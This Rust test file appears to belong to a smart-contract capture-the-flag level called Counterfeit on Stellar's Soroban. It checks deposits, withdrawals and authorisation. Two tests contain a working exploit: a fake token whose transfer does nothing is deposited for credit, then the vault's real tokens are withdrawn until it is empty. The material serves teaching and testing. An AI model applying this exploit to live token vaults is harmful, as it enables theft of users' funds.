extern crate std;

use super::{Counterfeit, CounterfeitClient};
use soroban_sdk::{
    Address, Env, contract, contractimpl,
    testutils::Address as _,
    token::{StellarAssetClient, TokenClient},
};

/// What the factory gives a level 6 instance: 1,000 tokens.
const VAULT: i128 = 1_000 * 10_000_000;

/// The attacker's contract: it looks like a token to whoever calls it, and
/// its `transfer` moves nothing.
#[contract]
struct FakeToken;

#[contractimpl]
impl FakeToken {
    pub fn transfer(_env: Env, _from: Address, _to: Address, _amount: i128) {}
}

fn setup() -> (
    Env,
    CounterfeitClient<'static>,
    TokenClient<'static>,
    Address,
) {
    let env = Env::default();
    env.mock_all_auths();
    let player = Address::generate(&env);
    let issuer = Address::generate(&env);
    let asset = env.register_stellar_asset_contract_v2(issuer);
    let id = env.register(Counterfeit, (&player, &asset.address()));
    StellarAssetClient::new(&env, &asset.address()).mint(&id, &VAULT);
    let client = CounterfeitClient::new(&env, &id);
    let token = TokenClient::new(&env, &asset.address());
    (env, client, token, player)
}

#[test]
fn starts_funded_and_unsolved() {
    let (_env, client, _token, player) = setup();
    assert_eq!(client.balance(), VAULT);
    assert_eq!(client.credit(&player), 0);
    assert!(!client.is_solved(&player));
}

#[test]
fn a_real_deposit_is_credited_and_can_be_withdrawn() {
    let (env, client, token, _player) = setup();
    let saver = Address::generate(&env);
    StellarAssetClient::new(&env, &token.address).mint(&saver, &500);

    client.deposit(&token.address, &saver, &500);
    assert_eq!(token.balance(&saver), 0);
    assert_eq!(client.credit(&saver), 500);

    client.withdraw(&saver, &500);
    assert_eq!(token.balance(&saver), 500);
    assert_eq!(client.credit(&saver), 0);
}

#[test]
fn cannot_withdraw_without_credit() {
    let (_env, client, _token, player) = setup();
    assert!(client.try_withdraw(&player, &1).is_err());
}

#[test]
fn a_real_deposit_needs_real_tokens() {
    let (env, client, token, _player) = setup();
    let broke = Address::generate(&env);
    assert!(client.try_deposit(&token.address, &broke, &500).is_err());
    assert_eq!(client.credit(&broke), 0);
}

#[test]
fn deposit_and_withdraw_require_the_owners_signature() {
    let (env, client, token, player) = setup();
    env.set_auths(&[]);
    assert!(client.try_deposit(&token.address, &player, &1).is_err());
    assert!(client.try_withdraw(&player, &1).is_err());
}

/// The exploit: deposit a counterfeit token, then cash the credit in.
#[test]
fn exploit_deposit_a_fake_token_then_withdraw_the_real_one() {
    let (env, client, token, player) = setup();
    let fake = env.register(FakeToken, ());

    client.deposit(&fake, &player, &VAULT);
    assert_eq!(client.credit(&player), VAULT);
    assert_eq!(client.balance(), VAULT);

    client.withdraw(&player, &VAULT);
    assert_eq!(token.balance(&player), VAULT);
    assert_eq!(client.balance(), 0);
    assert!(client.is_solved(&player));
}

#[test]
fn only_the_owner_can_solve_their_instance() {
    let (env, client, _token, _player) = setup();
    let thief = Address::generate(&env);
    let fake = env.register(FakeToken, ());
    client.deposit(&fake, &thief, &VAULT);
    client.withdraw(&thief, &VAULT);
    assert_eq!(client.balance(), 0);
    assert!(!client.is_solved(&thief));
}
